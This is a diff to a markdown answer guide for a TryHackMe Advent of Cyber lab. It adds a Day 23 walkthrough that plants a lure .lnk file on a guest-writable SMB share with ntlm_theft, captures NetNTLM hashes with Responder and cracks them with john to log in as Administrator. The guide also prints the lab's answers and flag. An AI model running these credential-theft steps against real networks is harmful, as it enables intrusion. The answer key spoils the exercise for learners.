@@ -34,9 +34,9 @@ This guide contains the answer and steps necessary to get to them for the [Adven
 - [Day 19 CrypTOYminers Sing Volala-lala-latility](#day-19-cryptoyminers-sing-volala-lala-latility)
 - [Day 20 Advent of Frostlings](#day-20-advent-of-frostlings)
 - [Day 21 Yule be Poisoned: A Pipeline of Insecure Code!](#day-21-yule-be-poisoned-a-pipeline-of-insecure-code)
-- [Day 22  Jingle Your SSRF Bells: A Merry Command & Control Hackventure](#day-22-jingle-your-ssrf-bells-a-merry-command-&-control-hackventure)
-<!--- [Day 23 ](#day-23-)
-- [Day 24 ](#day-24-)-->
+- [Day 22  Jingle Your SSRF Bells: A Merry Command & Control Hackventure](#day-22-jingle-your-ssrf-bells-a-merry-command--control-hackventure)
+- [Day 23 Relay All the Way](#day-23-relay-all-the-way)
+<!--- [Day 24 ](#day-24-)-->
 
 ### Day 1 Chatbot, tell me, if you're really safe? 
 
@@ -1798,17 +1798,95 @@ In this task we will exploit a SSRF vulnerability in the C2 server of McGreedy t
 
 If you enjoyed this task, feel free to check out the [SSRF](https://tryhackme.com/room/ssrfqi) room.
 
+### Day 23 Relay All the Way
+
+In this task we will be looking at coercing authentication techniques using Responder to get NTLM hashes from users we can crack to gain access to the server.
+
+1.  What is the name of the AD authentication protocol that makes use of tickets?
+
+   The answer to this question can be found in the text.
+
+   ><details><summary>Click for answer</summary>Kerberos</details>
+
+2. What is the name of the AD authentication protocol that makes use of the NTLM hash?
+
+   The answer to this question can be found in the text.
+
+   ><details><summary>Click for answer</summary>NetNTLM</details>
+
+3. What is the name of the tool that can intercept these authentication challenges?
+
+   The answer to this question can be found in the text.
+
+   ><details><summary>Click for answer</summary>Responder</details>
+
+4. What is the password that McGreedy set for the Administrator account?
+
+   Lets first create our NTLM hash theft file using `ntlm_theft` found [here](https://github.com/Greenwolf/ntlm_theft).
+
+   ```cmd
+   python3 ntlm_theft.py -g lnk -s 10.18.78.136 -f stealthy
+   ```
+
+   CREATE FILE
+
+   Now we can transfer this file to the share using `smbclient`.
+
+   ```cmd
+   smbclient //10.10.114.211/ElfShare/ -U guest%
+   put stealthy.lnk
+   dir
+   ```
+
+   TRANSFER FILE
+
+   Now we must start responder so it can listen for any received on our machine.
+
+   ```cmd
+   sudo responder -I tun0
+   or
+   responder -I ens5
+   ```
+
+   RESPONDER START
+
+   After waiting a little while we get a hit. The request contains the NTLM hash that could lead us to the password of the server.
+
+   RESPONDER INTERCEPT
+
+   Lets download the password list from the share to use as our wordlist.
+
+   ```cmd
+   get greedykeys.txt
+   ```
+
+   PASSWORD LIST
+
+   After adding the intercepted hash to a file, we can use `john` to crack the NTLM password.
+
+   ```cmd
+   john --wordlist=ntlm_theft/stealthy/greedykeys.txt hash.txt
+   ```
+
+   PASSWORD
+
+   ><details><summary>Click for answer</summary>GreedyGrabber1</details>
+
+5. What is the value of the flag that is placed on the Administrator’s desktop?
+
+   Now that we have the password belonging to the Administrator account, we can RDP into the server using Remmina.
+
+   On the desktop we can find our flag.
+
+   FLAG
+
+   ><details><summary>Click for answer</summary>THM{Greedy.Greedy.McNot.So.Great.Stealy}</details>
+
+If you enjoyed this task, feel free to check out the [Compromising Active Directory](https://tryhackme.com/module/hacking-active-directory) module!
+
 More days are yet to come!
 
 <!---
-
-### Day 23 
-
-
-
-1. 
-
-   ><details><summary>Click for answer</summary></details>
 
 ### Day 24 
 
